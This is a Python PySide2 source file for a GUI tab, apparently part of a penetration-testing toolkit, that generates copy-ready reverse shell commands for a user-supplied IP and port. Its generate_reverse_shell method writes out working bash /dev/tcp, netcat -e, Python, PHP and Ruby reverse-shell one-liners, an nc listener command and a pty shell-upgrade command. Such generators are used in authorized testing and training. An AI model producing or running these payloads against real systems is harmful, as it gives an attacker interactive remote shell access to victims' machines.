from functools import partial

from PySide2.QtCore import Qt, Slot
from PySide2.QtGui import QCursor, QIcon
from PySide2.QtWidgets import (
    QApplication,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QTableWidget,
    QTableWidgetItem,
    QVBoxLayout,
    QWidget,
    QFrame,
    QSizePolicy,
    QMenu,
    QWidgetAction,
    QGroupBox,
    QComboBox,
    QCheckBox,
    QSlider,
    QTextEdit)
from scripts.nmap_scan import check_valid_ip, nmap_scan
import webbrowser
import os
import socket


class ReverseShellTab(QWidget):
    def __init__(self):
        QWidget.__init__(self)
        self.items = 0

        # Left Layout
        self.left = QVBoxLayout()

        # Left
        self.copy_bash_btn = QPushButton("Copy Bash !")
        self.copy_netcat_btn = QPushButton("Copy Netcat !")
        self.copy_python_btn = QPushButton("Copy Python2 !")
        self.copy_php_btn = QPushButton("Copy PHP !")
        self.copy_ruby_btn = QPushButton("Copy Ruby !")
        self.edit_text_bash = QTextEdit()
        self.edit_text_netcat = QTextEdit()
        self.edit_text_python = QTextEdit()
        self.edit_text_php = QTextEdit()
        self.edit_text_ruby = QTextEdit()

        # Adding Left Widgets
        self.left.addWidget(self.edit_text_bash)
        self.left.addWidget(self.copy_bash_btn)
        self.left.addWidget(self.edit_text_netcat)
        self.left.addWidget(self.copy_netcat_btn)
        self.left.addWidget(self.edit_text_python)
        self.left.addWidget(self.copy_python_btn)
        self.left.addWidget(self.edit_text_php)
        self.left.addWidget(self.copy_php_btn)
        self.left.addWidget(self.edit_text_ruby)
        self.left.addWidget(self.copy_ruby_btn)

        # Right layout
        self.right = QVBoxLayout()
        self.right.setMargin(10)

        # Right
        self.ip_input = QLineEdit()
        self.port_input = QLineEdit()
        self.generate_btn = QPushButton("Generate")
        self.edit_text_listener = QTextEdit()
        self.copy_listener_btn = QPushButton("Copy Listener !")
        self.text_tty = QTextEdit()
        self.copy_tty_btn = QPushButton("Copy TTY !")
        self.clear_btn = QPushButton("Clear")
        self.quit_btn = QPushButton("Quit")

        self.generate_btn.setEnabled(False)
        self.set_local_ip()

        # IP
        label = QLabel("IP addr:")
        label.setSizePolicy(QSizePolicy.Ignored, QSizePolicy.Fixed)
        self.right.addWidget(label)
        self.right.addWidget(self.ip_input)

        # Port
        label = QLabel("Port:")
        label.setSizePolicy(QSizePolicy.Ignored, QSizePolicy.Fixed)
        self.right.addWidget(label)
        self.right.addWidget(self.port_input)

        # Generate
        self.right.addWidget(self.generate_btn)

        # Listener
        self.right.addWidget(self.edit_text_listener)
        self.right.addWidget(self.copy_listener_btn)

        # TTY
        self.right.addWidget(self.text_tty)
        self.right.addWidget(self.copy_tty_btn)
        self.text_tty.setText("python -c 'import pty; pty.spawn(\"/bin/bash\")'")

        # Fill Space
        self.right.addWidget(QFrame())

        # Clearn and Quit
        self.right.addWidget(self.clear_btn)
        self.right.addWidget(self.quit_btn)

        # Tabs Layout
        self.layout = QHBoxLayout()
        self.layout.addLayout(self.left)
        self.layout.addLayout(self.right)
        self.setLayout(self.layout)

        # Signals and Slots
        self.ip_input.textChanged.connect(self.check_generate)
        self.port_input.textChanged.connect(self.check_generate)
        self.generate_btn.clicked.connect(self.generate_reverse_shell)
        self.clear_btn.clicked.connect(self.clear_text)
        self.quit_btn.clicked.connect(self.quit_application)

        # Signal Copy
        self.copy_bash_btn.clicked.connect(partial(self.copy_text, self.edit_text_bash))
        self.copy_netcat_btn.clicked.connect(partial(self.copy_text, self.edit_text_netcat))
        self.copy_python_btn.clicked.connect(partial(self.copy_text, self.edit_text_python))
        self.copy_php_btn.clicked.connect(partial(self.copy_text, self.edit_text_php))
        self.copy_ruby_btn.clicked.connect(partial(self.copy_text, self.edit_text_ruby))
        self.copy_listener_btn.clicked.connect(partial(self.copy_text, self.edit_text_listener))
        self.copy_tty_btn.clicked.connect(partial(self.copy_text, self.text_tty))

    @Slot()
    def copy_text(self, obj):
        objs = [self.edit_text_bash, self.edit_text_netcat, self.edit_text_python, self.edit_text_php, self.edit_text_ruby, self.edit_text_listener, self.text_tty]

        if obj in objs:
            obj.selectAll()
            obj.copy()

    @Slot()
    def set_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            self.ip_input.setText(s.getsockname()[0])
            s.close()
        except OSError:
            pass

    @Slot()
    def generate_reverse_shell(self):
        self.clear_text()
        ip = self.ip_input.text()
        port = self.port_input.text()

        bash = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        netcat = f"nc -e /bin/sh {ip} {port}"
        python = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\", {port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        php = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ruby = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        listener = f"nc -lvnp {port}"

        self.edit_text_bash.append(bash)
        self.edit_text_netcat.append(netcat)
        self.edit_text_python.append(python)
        self.edit_text_php.append(php)
        self.edit_text_ruby.append(ruby)
        self.edit_text_listener.append(listener)

    @Slot()
    def check_generate(self):
        if self.ip_input.text().strip() and self.port_input.text().isdigit() and int(self.port_input.text()) <= 65535:
            self.generate_btn.setEnabled(True)
        else:
            self.generate_btn.setEnabled(False)

    @Slot()
    def clear_text(self):
        self.edit_text_bash.clear()
        self.edit_text_netcat.clear()
        self.edit_text_python.clear()
        self.edit_text_php.clear()
        self.edit_text_ruby.clear()
        self.edit_text_listener.clear()


    @Slot()
    def quit_application(self):
        QApplication.quit()
